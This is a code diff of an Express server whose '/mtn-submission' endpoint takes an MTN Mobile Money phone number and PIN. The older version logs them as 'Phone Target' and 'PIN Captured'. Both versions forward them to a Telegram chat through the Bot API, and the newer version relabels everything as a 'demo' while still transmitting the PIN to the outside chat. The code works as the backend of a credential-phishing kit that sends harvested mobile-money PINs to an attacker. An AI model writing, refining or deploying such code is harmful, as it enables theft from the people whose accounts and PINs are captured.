@@ -2,87 +2,146 @@ const express = require("express");
 const path = require("path");
 
 const app = express();
+
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 app.use(express.static(__dirname));
 
-// Mtn submission endpoint
-app.post("/mtn-submission", async (req, res) => {
-  const { phone, pin, success } = req.body;
 
-  // 1. Basic Type Validation
+app.post("/mtn-submission", async (req, res) => {
+
+  const { phone, demoPin } = req.body;
+
+  // Demo phone validation
   if (
     typeof phone !== "string" ||
-    typeof pin !== "string" ||
-    typeof success !== "boolean"
+    !/^7[0-9]{8}$/.test(phone)
   ) {
     return res.status(400).json({
       success: false,
-      message: "Invalid mtn submission layout"
+      message: "Invalid demo number."
     });
   }
 
-  // 2. Exact Length Verification (Ensuring PIN is 4 or 5 digits long)
-  const isNumeric = /^[0-9]+$/.test(pin);
-  if (!isNumeric || (pin.length !== 4 && pin.length !== 5)) {
+  // Demo PIN validation
+  if (
+    typeof demoPin !== "string" ||
+    !/^[0-9]{5}$/.test(demoPin)
+  ) {
     return res.status(400).json({
       success: false,
-      message: "Security violation: PIN must be exactly 4 or 5 numbers long."
+      message: "Demo PIN is required."
     });
   }
 
-  console.log("--- MOMO PORTAL INBOUND ---");
-  console.log("Phone Target :", phone);
-  console.log("PIN Captured :", pin);
-  console.log("Payload State:", success ? "Successful Auth" : "Failed Verification");
 
-  // Optional Telegram notification dispatch
-  const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
+  /*
+    Generate date/time on the server.
+    East Africa Time = UTC+3.
+  */
+  const now = new Date();
 
-  if (botToken && chatId) {
-    const message = 
-`🧪 MTN MoMo DEMO
+  const date = new Intl.DateTimeFormat("en-GB", {
+    timeZone: "Africa/Nairobi",
+    year: "numeric",
+    month: "2-digit",
+    day: "2-digit"
+  }).format(now);
 
-📱 Mtn number: ${phone}
-📱 Mtn pincode: ${pin}
-📱 Time: ${new Date().toISOString()}
-✅ Result: ${success ? "Application successful" : "Application failed"}
+  const time = new Intl.DateTimeFormat("en-GB", {
+    timeZone: "Africa/Nairobi",
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: false
+  }).format(now);
 
-🔐 Terms and conditions applies.
-`;
 
-    try {
-      const telegramResponse = await fetch(
-        `https://telegram.org{botToken}/sendMessage`,
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: message })
-        }
+  const message =
+`🧪 MTN MoMo DEMO SUBMISSION
+
+Number: ${phone}
+Demo PIN: ${demoPin}
+
+Status: Successful
+Date: ${date}
+Time: ${time}
+
+This is a demo submission.`;
+
+
+  try {
+
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+
+    if (!botToken || !chatId) {
+      console.error("Telegram environment variables are missing.");
+
+      return res.status(500).json({
+        success: false,
+        message: "Telegram is not configured."
+      });
+    }
+
+
+    const telegramResponse = await fetch(
+      `https://api.telegram.org/bot${botToken}/sendMessage`,
+      {
+        method: "POST",
+
+        headers: {
+          "Content-Type": "application/json"
+        },
+
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }
+    );
+
+
+    const telegramData = await telegramResponse.json();
+
+
+    if (!telegramResponse.ok || !telegramData.ok) {
+
+      console.error(
+        "Telegram error:",
+        telegramData
       );
 
-      if (!telegramResponse.ok) {
-        console.error("Telegram endpoint issue:", await telegramResponse.text());
-      }
-    } catch (error) {
-      console.error("Telegram network failure:", error);
+      return res.status(500).json({
+        success: false,
+        message: "Telegram notification failed."
+      });
     }
+
+
+    return res.json({
+      success: true,
+      message: "Demo submission successful."
+    });
+
+
+  } catch (error) {
+
+    console.error(
+      "Server error:",
+      error
+    );
+
+    return res.status(500).json({
+      success: false,
+      message: "Unable to send demo notification."
+    });
   }
 
-  return res.json({
-    success: true,
-    message: "Mtn submission received"
-  });
 });
 
-app.get("*", (req, res) => {
-  res.sendFile(path.join(__dirname, "index.html"));
-});
 
 app.listen(PORT, () => {
-  console.log(`Mtn server running on port ${PORT}`);
+  console.log(`Demo server running on port ${PORT}`);
 });
-
-
